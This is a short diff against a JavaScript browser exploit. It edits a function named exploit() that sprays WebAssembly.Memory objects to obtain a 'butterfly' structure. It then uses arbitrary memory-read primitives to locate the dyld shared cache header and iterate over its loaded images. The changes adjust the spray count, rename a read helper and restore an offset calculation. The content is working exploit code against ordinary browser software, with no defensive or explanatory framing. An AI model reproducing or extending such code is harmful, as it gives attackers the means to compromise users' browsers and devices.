@@ -299,7 +299,7 @@ function exploit(){
         }
         
         log('[*] Spraying structures to get a butterfly (2/2)...');
-        for (var i = 0; i < 10000; i++) {
+        for (var i = 0; i < 1000; i++) {
             var a = new WebAssembly.Memory({inital: 0});
             a['prop' + i] = 1337;
             structs.push(a);
@@ -588,7 +588,7 @@ function exploit(){
         }
 
         alert('dyld cache header @' + hdr);
-        var uuid = memory.readInt64(Add(hdr, 0x58));
+        var uuid = memory.read_i64(Add(hdr, 0x58));
         alert("uuid: " + ha(uuid))
         //var dcachedump = String.fromCharCode(...memory.copyfrom(hdr,0,100))
         
@@ -712,7 +712,7 @@ function exploit(){
         for(var i = 0; i < nimgs; i++)
         {
         
-           // var m = i * 0x20;
+            var m = i * 0x20;
             alert(memory.u32(Add(imgs,m + 0x18)))
             var straddr = off2addr(segs, memory.u32(Add(imgs,m + 0x18)));
             var fn = function(i)
